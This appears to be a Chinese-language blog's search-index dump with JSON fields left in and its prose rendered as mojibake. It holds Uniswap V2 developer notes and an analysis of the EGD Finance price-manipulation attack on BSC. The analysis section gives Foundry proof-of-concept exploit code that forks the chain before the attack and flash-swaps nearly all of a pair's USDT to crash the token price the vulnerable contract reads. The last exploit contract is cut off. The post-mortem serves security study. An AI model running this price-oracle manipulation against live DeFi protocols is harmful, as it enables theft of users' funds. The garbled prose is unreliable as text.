åœ°å€ æ–¹å¼1: ä½¿ç”¨Factoryçš„getPairå‡½æ•° # æ¯”å¦‚æŸ¥è¯¢ DAI-USDCäº¤æ˜“å¯¹å¯¹åº”çš„Pair # DAI: 0x6B175474E89094C44Da98b954EedeAC495271d0F # USDC: 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 # è¿”å›: 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5 cast call 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f \"getPair(address,address)(address)\" 0x6B175474E89094C44Da98b954EedeAC495271d0F 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48 æ–¹å¼2 Pairæ˜¯é€šè¿‡Create2 åˆ›å»ºçš„, æ‰€ä»¥å…¶åœ°å€æ˜¯å¯ä»¥è®¡ç®—å‡ºæ¥çš„, å‚è€ƒè¿™é‡Œ https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/getting-pair-addresses ä¸¾ä¾‹: function testPairAddress() public view { address factory = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; address token0 = 0x6B175474E89094C44Da98b954EedeAC495271d0F; // DAI address token1 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC //æ–¹å¼1 address pairAddress1 = IUniswapV2Factory(factory).getPair( token0, token1 ); //æ–¹å¼2 (ä¸‹é¢çš„ä»£ç å¯¹äºä»»ä½•pairéƒ½ä¸€æ ·, ä¸ç”¨å˜) address pairAddress2 = address( uint160( ( uint( keccak256( abi.encodePacked( hex\"ff\", factory, keccak256(abi.encodePacked(token0, token1)), hex\"96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f\" ) ) ) ) ) ); console2.log(\"pair address 1:\", pairAddress1); console2.log(\"pair address 2:\", pairAddress2); assert(pairAddress1 == pairAddress2); } å…¶ä¸­ 96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f æ˜¯uniswapåˆ›å»ºpairæ—¶ä¼ é€’ç»™creat2çš„ keccak256(init_code) æ¥å£ import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol'; import IUniswapV2Pair from '@uniswap/v2-core/build/IUniswapV2Pair.json' pragma solidity \u003e=0.5.0; interface IUniswapV2Pair { event Approval(address indexed owner, address indexed spender, uint value); event Transfer(address indexed from, address indexed to, uint value); function name() external pure returns (string memory); function symbol() external pure returns (string memory); function decimals() external pure returns (uint8); function totalSupply() external view returns (uint); function balanceOf(address owner) external view returns (uint); function allowance(address owner, address spender) external view returns (uint); function approve(address spender, uint value) external returns (bool); function transfer(address to, uint value) external returns (bool); function transferFrom(address from, address to, uint value) external returns (bool); function DOMAIN_SEPARATOR() external view returns (bytes32); function PERMIT_TYPEHASH() external pure returns (bytes32); function nonces(address owner) external view returns (uint); function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external; event Mint(address indexed sender, uint amount0, uint amount1); event Burn(address indexed sender, uint amount0, uint amount1, address indexed to); event Swap( address indexed sender, uint amount0In, uint amount1In, uint amount0Out, uint amount1Out, address indexed to ); event Sync(uint112 reserve0, uint112 reserve1); function MINIMUM_LIQUIDITY() external pure returns (uint); function factory() external view returns (address); function token0() external view returns (address); func","date":"2023-03-13","objectID":"/uniswap/:3:2","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"Pair (ERC20) https://docs.uniswap.org/contracts/v2/reference/smart-contracts/Pair-ERC-20#allowance å‚è€ƒä¸Šé¢çš„é“¾æ¥, ä¸ºæµåŠ¨æ€§ä»£å¸å®ç°çš„ERC20çš„ç›¸å…³åŠŸèƒ½ ç‰¹åˆ«è¯´æ˜çš„æ˜¯permit permit function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external; å®ƒçš„ä½œç”¨æ˜¯è®©ä¸€ä¸ªåœ°å€ spender èƒ½å¤Ÿä»£è¡¨ä¸€ä¸ªåœ°å€ owner è¿›è¡Œä¸€å®šæ•°é‡çš„ä»£å¸äº¤æ˜“ï¼Œè€Œä¸éœ€è¦åœ¨æ¯æ¬¡äº¤æ˜“ä¹‹å‰éƒ½å¾—åˆ° owner çš„æˆæƒã€‚ permit å‡½æ•°æ˜¯ ERC20 ä¸­çš„ä¸€ç§æ–°å‹æˆæƒæœºåˆ¶ï¼Œå®ƒå…è®¸ç”¨æˆ·åœ¨ä¸€æ¬¡æ“ä½œä¸­åŒæ—¶æˆæƒ spender è¿›è¡Œä¸€å®šæ•°é‡çš„ä»£å¸äº¤æ˜“ï¼Œå¹¶è®¾ç½®ä¸€ä¸ªè¿‡æœŸæ—¶é—´ deadlineã€‚é€šè¿‡ permit å‡½æ•°è¿›è¡Œæˆæƒï¼Œå¯ä»¥é¿å…ç”¨æˆ·åœ¨æ¯æ¬¡äº¤æ˜“ä¹‹å‰éƒ½éœ€è¦é€šè¿‡ä¼ ç»Ÿçš„ approve å‡½æ•°è¿›è¡Œæˆæƒè¿‡ç¨‹ã€‚ è€Œ Uniswap ä¸­çš„ permit å‡½æ•°åˆ™æ˜¯å°†è¿™ç§æˆæƒæœºåˆ¶é›†æˆåˆ°äº†äº¤æ˜“è¿‡ç¨‹ä¸­ã€‚å½“æŸä¸ªåœ°å€éœ€è¦è¿›è¡Œäº¤æ˜“æ—¶ï¼Œå®ƒå¯ä»¥å…ˆè°ƒç”¨ permit å‡½æ•°è¿›è¡Œæˆæƒï¼Œç„¶åå†ç›´æ¥è¿›è¡Œäº¤æ˜“ã€‚è¿™æ ·æ—¢æ–¹ä¾¿äº†ç”¨æˆ·ï¼Œä¹Ÿæé«˜äº†äº¤æ˜“çš„æ•ˆç‡ã€‚ ownerï¼šéœ€è¦è¿›è¡Œæˆæƒçš„åœ°å€ï¼› spenderï¼šè¢«æˆæƒçš„åœ°å€ï¼› valueï¼šè¢«æˆæƒçš„ä»£å¸æ•°é‡ï¼› deadlineï¼šæˆæƒè¿‡æœŸæ—¶é—´æˆ³ï¼› vã€rã€sï¼šç”¨äºç­¾åéªŒè¯çš„å‚æ•°(ECDSA ç­¾åç®—æ³•) éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™ä¸ªå‡½æ•°éœ€è¦ç”¨æˆ·å…ˆå¯¹æˆæƒè¿›è¡Œç­¾åï¼Œå› æ­¤å®ƒå¹¶ä¸æ˜¯ç›´æ¥è°ƒç”¨çš„ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œç”¨æˆ·éœ€è¦é€šè¿‡ä¸€äº›å…¶ä»–çš„å·¥å…·æˆ–è€…åº“æ¥è¿›è¡Œç­¾åï¼Œç„¶åå†å°†ç­¾ååçš„æ•°æ®ä½œä¸ºå‚æ•°ä¼ å…¥åˆ° permit å‡½æ•°ä¸­ã€‚ ","date":"2023-03-13","objectID":"/uniswap/:3:3","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"Router01 åœ°å€ 0xf164fC0Ec4E93095b804a4795bBe1e041497b92a Router01æœ‰bugè¢«å¼ƒç”¨äº† ","date":"2023-03-13","objectID":"/uniswap/:3:4","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["Blockchain"],"content":"Router02 https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02 åœ°å€ 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D æ¥å£ https://github.com/Uniswap/v2-periphery import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol'; import IUniswapV2Router02 from '@uniswap/v2-periphery/build/IUniswapV2Router02.json' factory è¿”å›facotryåˆçº¦åœ°å€ function factory() external pure returns (address); WETH è¿”å› WETHçš„åœ°å€, å…³äºWETH: https://blog.0xproject.com/canonical-weth-a9aa7d0279dd function WETH() external pure returns (address); quote getAmountOut getAmountIn getAmountsOut getAmountsIn å‚è€ƒ Libraryåˆçº¦ä¸­çš„ç›¸å…³å‡½æ•° addLiquidity å¢åŠ  ERC-20â‡„ERC-20 æ± å­çš„æµåŠ¨æ€§ https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#addliquidity è°ƒç”¨å‰éœ€è¦å…ˆè°ƒç”¨IERC20çš„Approveä¸ºRouteræ‰¹å‡†é¢åº¦ Token ä¸èƒ½æ˜¯USDT å¦‚æœå¯¹åº”çš„Pairä¸å­˜åœ¨åˆ™ä¼šåˆ›å»º https://github.com/Uniswap/v2-periphery/blob/master/contracts/UniswapV2Router02.sol#L41 function addLiquidity( address tokenA, // æ·»åŠ æµåŠ¨æ€§ tokenA çš„åœ°å€ address tokenB, // æ·»åŠ æµåŠ¨æ€§ tokenB çš„åœ°å€ uint amountADesired, // æœŸæœ›æ·»åŠ  tokenA çš„æ•°é‡ uint amountBDesired, // æœŸæœ›æ·»åŠ  tokenB çš„æ•°é‡ uint amountAMin, // æ·»åŠ  tokenA çš„æœ€å°æ•°é‡ uint amountBMin // æ·»åŠ  tokenB çš„æœ€å°æ•°é‡ address to, // è·å¾—çš„æµåŠ¨æ€§ä»£å¸å‘é€åˆ°çš„åœ°å€ uint deadline // è¿‡æœŸæ—¶é—´ ) external returns ( uint amountA, // å®é™…æ·»åŠ  tokenA çš„æ•°é‡ uint amountB, // å®é™…æ·»åŠ  tokenB çš„æ•°é‡ uint liquidity // è·å¾—æµåŠ¨æ€§ä»£å¸çš„æ•°é‡ ); ä¸¾ä¾‹: // SPDX-License-Identifier: SEE LICENSE IN LICENSE pragma solidity ^0.8.10; import \"forge-std/Test.sol\"; // forge install OpenZeppelin/openzeppelin-contracts --no-commit import \"lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol\"; // forge install --no-commit Uniswap/v2-core import \"lib/v2-core/contracts/interfaces/IUniswapV2Factory.sol\"; import \"lib/v2-core/contracts/interfaces/IUniswapV2Pair.sol\"; // forge install --no-commit Uniswap/v2-periphery import \"lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol\"; IUniswapV2Router02 constant UNISWAP_V2_ROUTER = IUniswapV2Router02( 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D ); IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); contract ExampleToken is ERC20 { constructor( string memory _name, string memory _symbol ) ERC20(_name, _symbol) { uint256 initSupply = 100000 * 10 ** decimals(); _mint(msg.sender, initSupply); } } contract RouterTest is Test { ExampleToken ext; function setUp() public { vm.createSelectFork(\"mainnet\"); ext = new ExampleToken(\"ExampleToken\", \"EXT\"); deal(address(WETH), address(this), 10000 ether); } function testAddLiquidity() public { ext.approve(address(UNISWAP_V2_ROUTER), 10000 ether); WETH.approve(address(UNISWAP_V2_ROUTER), 1000 ether); (uint amountA, uint amountB, uint liquidity) = UNISWAP_V2_ROUTER .addLiquidity( address(ext), address(WETH), 10000 ether, 1000 ether, 0, 0, address(this), block.timestamp + 1000 ); console2.log(\"amountA:\", amountA); console2.log(\"amountB:\", amountB); console2.log(\"liquidity:\", liquidity); IUniswapV2Factory factory = IUniswapV2Factory( UNISWAP_V2_ROUTER.factory() ); address pairAddress = factory.getPair(address(ext), address(WETH)); IUniswapV2Pair pair = IUniswapV2Pair(pairAddress); console2.log(\"pair address:\", pairAddress); console2.log(\"liquidity token i have:\", pair.balanceOf(address(this))); } } è¾“å‡º: Logs: amountA: 10000000000000000000000 amountB: 1000000000000000000000 liquidity: 3162277660168379330998 pair address: 0x35318373409608AFC0f2cdab5189B3cB28615008 liquidity token i have: 3162277660168379330998 addLiquidityETH https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#addliquidityeth ä½¿ç”¨ETHå’ŒTokençš„å¢åŠ  ERC-20â‡„WETH æ± å­çš„æµåŠ¨æ€§ ç”¨æ³•å’ŒaddLiquidityç±»ä¼¼, åªä¸æ˜¯ETHæ˜¯é€šè¿‡msg.valueä¼ å…¥çš„ function addLiquidityETH( address token, uint amountTokenDesired, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) external payable returns (uint amountToken, uint amountETH, uint liquidity); removeLiquidity removeLiquidityETH https://docs.uniswap.org/contracts/v2/reference/smart-contracts/router-02#removeliquidity å¢åŠ æµåŠ¨æ€§çš„åå‘æ“ä½œ: é™ä½æµåŠ¨æ€§ å¹¶é”€æ¯ä¸€éƒ¨åˆ†æµåŠ¨æ€§ä»£å¸ removeLiquidityWithPermit removeLiquidityETHWithPermit","date":"2023-03-13","objectID":"/uniswap/:3:5","tags":["swap","L3","Web3.0"],"title":"Uniswap","uri":"/uniswap/"},{"categories":["security"],"content":"èƒŒæ™¯ä»‹ç» æ”»å‡»äº‹ä»¶å‘ç”Ÿåœ¨ https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3 æ”»å‡»è€…è°ƒç”¨æ”»å‡»åˆçº¦å¯¹ EGD_Finance è¿›è¡Œäº†ä»·æ ¼æ“çºµæ”»å‡», è¿›è€Œå¥—ç°äº†ä¸å°‘USDT. å¯ä»¥åœ¨è¿™é‡Œçœ‹åˆ°æ”»å‡»æµç¨‹: https://phalcon.blocksec.com/tx/bsc/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3 å¦å¤–ä¸€ç¯‡å…³äºè¯¥æ”»å‡»çš„é€†å‘åˆ†ææ•™ç¨‹åœ¨è¿™é‡Œ: https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/academy/onchain_debug/03_write_your_own_poc#æ‰‹æŠŠæ‰‹æ’°å¯«-pocâ€”ä»¥-egd-finance-ç‚ºä¾‹ æˆ‘è¿™é‡Œä»æ­£å‘çš„è§’åº¦, ä¸€æ­¥æ­¥æ¥å›æ”¾æœ¬æ¬¡æ”»å‡». ","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:1:0","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["security"],"content":"Code Review ","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:2:0","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["security"],"content":"é€»è¾‘åˆçº¦ EGD_Finance ä»£ç†åˆçº¦ä½ç½® : https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#code é€šè¿‡ç‚¹å‡»åŒºå—é“¾æµè§ˆå™¨ä¸Šçš„\"Read as Proxy\" æŒ‰é’®å¯ä»¥å¾—åˆ°å…¶é€»è¾‘åˆçº¦ä¸º \" 0x93c175439726797dcee24d08e4ac9164e88e7aee\" æˆ–è€…é€šè¿‡è¯»å–ä»£ç†åˆçº¦çš„_IMPLEMENTATION_SLOT ä¹Ÿå¯ä»¥å¾—åˆ°å½“å‰ä½¿ç”¨çš„é€»è¾‘åˆçº¦åœ°å€ bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; åœ¨é€»è¾‘åˆçº¦ EGD_Financeä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å®ç°äº†ä¸€ä¸ª\"è´¨æŠ¼USDTå¥–åŠ±EGD token\"çš„åŠŸèƒ½. åŸºæœ¬æµç¨‹æ˜¯ ç”¨æˆ·Aå¡«å†™é‚€è¯·äººç”¨æˆ·B : function bond(address invitor) external: ç”¨æˆ·Aå°†ä¸€å®šæ•°é‡çš„USDTè´¨æŠ¼ç»™EGD_Finance: function stake(uint amount) external ç»è¿‡ä¸€æ®µæ—¶é—´å ç”¨æˆ·Aè¦æ±‚é¢†å–è´¨æŠ¼å¥–åŠ±: function claimAllReward() external EGD_Financeæ ¹æ®ç”¨æˆ·è´¨æŠ¼æ•°é‡, è´¨æŠ¼æ—¶é•¿, å½“å‰EGD tokençš„ä»·æ ¼ç­‰å› ç´ , å°†å¥–åŠ±å‘æ”¾ç»™ç”¨æˆ·A function claimAllReward() external { // åˆ¤æ–­æ˜¯å¦æœ‰è´¨æŠ¼ require(userInfo[msg.sender].userStakeList.length \u003e 0, 'no stake'); // åˆ¤æ–­æ˜¯å¦åœ¨é»‘åå• require(!black[msg.sender],'black'); uint[] storage list = userInfo[msg.sender].userStakeList; uint rew; uint outAmount; uint range = list.length; //è®¡ç®—å¥–åŠ±æ•°é‡ for (uint i = 0; i \u003c range; i++) { UserSlot storage info = userSlot[msg.sender][list[i - outAmount]]; require(info.totalQuota != 0, 'wrong index'); uint quota = (block.timestamp - info.claimTime) * info.rates; if (quota \u003e= info.leftQuota) { quota = info.leftQuota; } //è·å–å½“å‰EGDçš„ä»·æ ¼,å¹¶ç¡®å®šå‘æ”¾EDGæ•°é‡ //EGDè¶Šä¾¿å®œ, è·å¾—çš„EGDæ•°é‡å°±è¶Šå¤š rew += quota * 1e18 / getEGDPrice(); info.claimTime = block.timestamp; info.leftQuota -= quota; info.claimedQuota += quota; if (info.leftQuota == 0) { userInfo[msg.sender].totalAmount -= info.totalQuota; delete userSlot[msg.sender][list[i - outAmount]]; list[i - outAmount] = list[list.length - 1]; list.pop(); outAmount ++; } } //æ›´æ–°è´¨æŠ¼åˆ—è¡¨ userInfo[msg.sender].userStakeList = list; //å‘é€å¥–åŠ± EGD.transfer(msg.sender, rew); userInfo[msg.sender].totalClaimed += rew; emit Claim(msg.sender,rew); } ","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:2:1","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["security"],"content":"æ¼æ´ä»£ç  é‡‡ç”¨äº†å¦‚ä¸‹å‡½æ•°è®¡ç®—EGD tokenä»·æ ¼ function getEGDPrice() public view returns (uint){ uint balance1 = EGD.balanceOf(pair); uint balance2 = U.balanceOf(pair); return (balance2 * 1e18 / balance1); } å…¶ä¸­ address public pairæ˜¯åœ¨åˆå§‹åŒ–å‡½æ•°ä¸­èµ‹å€¼çš„: function initialize() public initializer { __Context_init_unchained(); __Ownable_init_unchained(); rate = [200, 180, 160, 140]; startTime = block.timestamp; referRate = [6, 3, 1, 1, 1, 1, 1, 1, 2, 3]; rateList = [547,493,438,383]; dailyStakeLimit = 1000000 ether; wallet = 0xC8D45fF624F698FA4E745F02518f451ec4549AE8; fund = 0x9Ce3Aded1422A8c507DC64Ce1a0C759cf7A4289F; EGD = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98); U = IERC20(0x55d398326f99059fF775485246999027B3197955); router = IPancakeRouter02(0x10ED43C718714eb63d5aA57B78B54704E256024E); pair = IPancakeFactory(router.factory()).getPair(address(EGD),address(U)); } å¯ä»¥åœ¨ ä»£ç†åˆçº¦ çš„ Read as Proxy ä¸­ç‚¹å‡» pairå¾—åˆ°, å…¶å€¼ä¸º 0xa361433E409Adac1f87CDF133127585F8a93c67d æˆ–è€…é€šè¿‡ ä¸‹é¢çš„å‘½ä»¤è¡Œå¾—åˆ° \u003e anvil -f https://rpc.ankr.com/bsc --fork-block-number 20245522 \u003e cast call 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370 \"pair()\" //0x000000000000000000000000a361433e409adac1f87cdf133127585f8a93c67d åœ¨åŒºå—é“¾æµè§ˆå™¨ä¸­å¯ä»¥çœ‹åˆ°è¯¥åœ°å€æ˜¯Pancake LPs (Cake-LP) (PancakeæµåŠ¨æ€§æä¾›å•†) ä¹Ÿå°±æ˜¯è¯´ getEGDPrice()æ˜¯æ ¹æ®åœ°å€0xa361433E409Adac1f87CDF133127585F8a93c67dä¸Šçš„EGD tokenæ•°é‡å’ŒUSDTçš„æ•°é‡ (ä¹Ÿå°±æ˜¯æµåŠ¨æ€§)è¿›è¡Œä»·æ ¼è®¡ç®—çš„. å½“USDTæ•°é‡è¿œè¿œå¤šäºEDGæ•°é‡æ—¶, EDGå°±èƒ½å…‘æ¢æ›´å¤šçš„USDT, ä¹Ÿå°±æ˜¯EDGæ›´æ˜‚è´µ ç›¸å, å½“USDTæ•°é‡å¾ˆå°‘æ—¶, EDGå°±å…‘æ¢æ›´å°‘çš„USDT, ä¹Ÿå°±æ˜¯EDGæ›´ä¾¿å®œ. ä½†æˆ‘ä»¬çŸ¥é“åœ¨è¯¥Pancke Swap LPs æä¾›äº†swapå‡½æ•°è¿›è¡Œå€Ÿè´·æ“ä½œ, æˆ‘ä»¬å¯ä»¥å¤§é‡å€Ÿå‡ºUSDT, è®©EDGå˜å¾—éå¸¸ä¾¿å®œ, é‚£ä¹ˆæ ¹æ®ä¸‹é¢çš„ä»£ç , ç”¨æˆ·è·å¾—çš„ç”¨äºå¥–åŠ±çš„EDGçš„æ•°é‡å°±éå¸¸å¤š. //è·å–å½“å‰EGDçš„ä»·æ ¼,å¹¶ç¡®å®šå‘æ”¾EDGæ•°é‡ //EGDè¶Šä¾¿å®œ, è·å¾—çš„EGDæ•°é‡å°±è¶Šå¤š rew += quota * 1e18 / getEGDPrice(); ","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:2:2","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["security"],"content":"æ”»å‡»è¿‡ç¨‹ ","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:3:0","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["security"],"content":"æ“çºµEGD/USDTçš„ä»·æ ¼, è®©EGDéå¸¸ä¾¿å®œ // SPDX-License-Identifier: MIT pragma solidity ^0.8.10; import \"forge-std/test.sol\"; interface IPancakePair { function swap( uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data ) external; } interface IEGD_Finance { function getEGDPrice() external view returns (uint256); } interface IERC20 { function transfer(address to, uint256 value) external returns (bool); function balanceOf(address owner) external view returns (uint256); } //BSC_USDTåˆçº¦åœ°å€ address constant usdt = 0x55d398326f99059fF775485246999027B3197955; //EGD_Financeåˆçº¦åœ°å€ address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370; //æ”»å‡»å‘ç”Ÿå‰çš„åŒºå—é«˜åº¦ uint256 constant blockheight = 20245522; //LPs IPancakePair constant EGD_USDT_LPPool = IPancakePair( 0xa361433E409Adac1f87CDF133127585F8a93c67d ); contract PriceManipulateTest is Test { IEGD_Finance egdFinance; function setUp() public { //fork æ”»å‡»å‘ç”Ÿå‰çš„ç½‘ç»œ vm.createSelectFork(\"https://rpc.ankr.com/bsc\", blockheight); egdFinance = IEGD_Finance(EGD_Finance); //å‡è®¾æˆ‘ä»¬çš„è´¦æˆ·ä¸Šæœ‰ä¸€äº›USDT deal(address(usdt), address(this), 30000 * 1 ether); } function testPrice() public { console2.log(\"edg price before:\", egdFinance.getEGDPrice()); //å€Ÿå‡º99.99%çš„USDT, è®©USDTå˜å¾—éå¸¸ç¨€å°‘ uint256 borrowUSDT = (IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925) / 10_000_000_000; EGD_USDT_LPPool.swap(0, borrowUSDT, address(this), \"abcd\"); console2.log( \"edg price after (i return the borrowed USDT back):\", egdFinance.getEGDPrice() ); } function pancakeCall( address, uint256, uint256 count1, bytes calldata ) public { console2.log( \"edg price after (i borrowed huge USDT out):\", egdFinance.getEGDPrice() ); bool success = IERC20(usdt).transfer( address(EGD_USDT_LPPool), ((count1 * 10_500_000_000) / 10_000_000_000) ); //å½’è¿˜æœ¬é‡‘ + 5%æ‰‹ç»­è´¹ require(success); } } è¾“å‡º: ~/Desktop/EGDFinanceDemo main !2 ï™9 â¯ forge test --match-contract PriceManipulateTest [â ‘] Compiling... [â ’] Compiling 1 files with 0.8.17 [â †] Solc 0.8.17 finished in 2.36s Compiler run successful Running 1 test for test/PriceManipulate.t.sol:PriceManipulateTest [PASS] testPrice() (gas: 90127) Logs: edg price before: 8093644493314726 edg price after (i borrowed huge USDT out): 60702333 edg price after (i return the borrowed USDT back): 8498326714945346 å¯ä»¥çœ‹åˆ°åœ¨æˆ‘å€Ÿå‡ºå¤§é‡USDTå å’Œ å½’è¿˜å€Ÿå‡ºçš„USDTå‰, EDGçš„ä»·æ ¼ç”± 8093644493314726 å˜æˆäº† 60702333, å½’è¿˜USDTåä»·æ ¼åˆæ¢å¤äº†. ","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:3:1","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["security"],"content":"è´¨æŠ¼USDTè·å–EGDå¥–åŠ± // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"forge-std/test.sol\"; address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370; address constant usdt = 0x55d398326f99059fF775485246999027B3197955; address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98; uint256 constant blockheight = 20245522; interface IEGD_Finance { function bond(address invitor) external; function stake(uint256 amount) external; function calculateAll(address addr) external view returns (uint256); function claimAllReward() external; function getEGDPrice() external view returns (uint256); function userInfo( address ) external view returns ( uint256 totalAmount, uint256 totalClaimed, address invitor, bool isRefer, uint256 refer, uint256 referReward ); } interface IERC20 { function decimals() external view returns (uint8); function balanceOf(address owner) external view returns (uint256); function approve(address spender, uint256 value) external returns (bool); function transfer(address to, uint256 value) external returns (bool); } contract StakeTest is Test { IEGD_Finance egd_finance; function setUp() public { vm.createSelectFork(\"https://rpc.ankr.com/bsc\", blockheight); egd_finance = IEGD_Finance(EGD_Finance); deal(usdt, address(this), 10000 * 10e18); } function testStake() public { /** å¦‚ä½•æ‰¾åˆ°ä¸€ä¸ªæ¨èäººåœ°å€ åˆ°åˆçº¦åœ°å€egd_finance https://bscscan.com/address/0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370#events æŸ¥çœ‹äº‹ä»¶ï¼Œç”¨cast 4byte-event \u003ctopic0\u003eï¼Œ å¦‚æœç»“æœæ˜¯Claim(address,uint256)ï¼Œ é‚£ä¹ˆtopic1å°±æ˜¯é¢†å–è´¨æŠ¼å¥–åŠ±çš„äººçš„åœ°å€ ç”¨å®ƒå½“æ¨èäººå°±å¯ä»¥äº†ã€‚æ³¨æ„ï¼Œ topic1ä¸­çš„åœ°å€éœ€è¦ç”¨å·¥å…·toChecksumAddressè½¬æ¢ä¸€ä¸‹ï¼Œæ¯”å¦‚https://web3-tools.netlify.app */ //å¡«å†™æ¨èäºº egd_finance.bond(address(0x85cbfaBD709c744C84A36BA47145396d724EE751)); //æ‰¹å‡†egd_financeæ“ä½œæˆ‘ä»¬çš„usdt IERC20(usdt).approve(address(egd_finance), 100 ether); //è´¨æŠ¼ egd_finance.stake(100 ether); (uint256 totalAmount, , , , , ) = egd_finance.userInfo(address(this)); console2.log(\"usdt i staked:\", totalAmount); console2.log(\"edg i have:\", IERC20(egd).balanceOf(address(this))); assertEq(100 ether, totalAmount); //æ¨¡æ‹Ÿ2å¤©å vm.warp(block.timestamp + (2 * 24 * 60 * 60)); //é¢†å–å¥–åŠ± egd_finance.claimAllReward(); console2.log( \"edg i get from the stake reward (2 days later):\", IERC20(egd).balanceOf(address(this)) ); } } è¾“å‡º ~/Desktop/EGDFinanceDemo main !2 ï™9 â¯ forge test --match-contract StakeTest -vv [â ‘] Compiling... [â ¢] Compiling 1 files with 0.8.17 [â †] Solc 0.8.17 finished in 2.41s Compiler run successful Running 1 test for test/Stake.t.sol:StakeTest [PASS] testStake() (gas: 868614) Logs: usdt i staked: 100000000000000000000 edg i have: 0 edg i get from the stake reward (2 days later): 135123268981974350000 å¯ä»¥çœ‹åˆ°, åœ¨æ­£å¸¸æƒ…å†µä¸‹ è´¨æŠ¼ 100ä¸ªUSDT, 2å¤©åå¤§çº¦èƒ½è·å–135ä¸ªEDG ","date":"2023-03-06","objectID":"/analyse_of_egd_finance_attack/:3:2","tags":["defi"],"title":"EGD Finance ä»·æ ¼æ“çºµæ”»å‡»äº‹ä»¶åˆ†æ","uri":"/analyse_of_egd_finance_attack/"},{"categories":["security"],"content":"åœ¨æ“çºµä»·æ ¼åè·å–EGDå¥–åŠ± // SPDX-License-Identifier: MIT pragma solidity ^0.8.10; import \"forge-std/test.sol\"; interface IPancakePair { function swap( uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data ) external; } interface IEGD_Finance { function getEGDPrice() external view returns (uint256); function calculateAll(address addr) external view returns (uint256); function bond(address invitor) external; function stake(uint256 amount) external; function claimAllReward() external; } interface IERC20 { function transfer(address to, uint256 value) external returns (bool); function balanceOf(address owner) external view returns (uint256); function approve(address spender, uint256 value) external returns (bool); } address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370; address constant usdt = 0x55d398326f99059fF775485246999027B3197955; address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98; uint256 constant blockheight = 20245522; IPancakePair constant EGD_USDT_LPPool = IPancakePair( 0xa361433E409Adac1f87CDF133127585F8a93c67d ); contract HackTest1 is Test { IEGD_Finance egd_finance; function setUp() public { vm.createSelectFork(\"https://rpc.ankr.com/bsc\", blockheight); egd_finance = IEGD_Finance(EGD_Finance); deal(usdt, address(this), 50000 ether); } function testHack() public { stake(); //æ¨¡æ‹Ÿ2å¤©å vm.warp(block.timestamp + (2 * 24 * 60 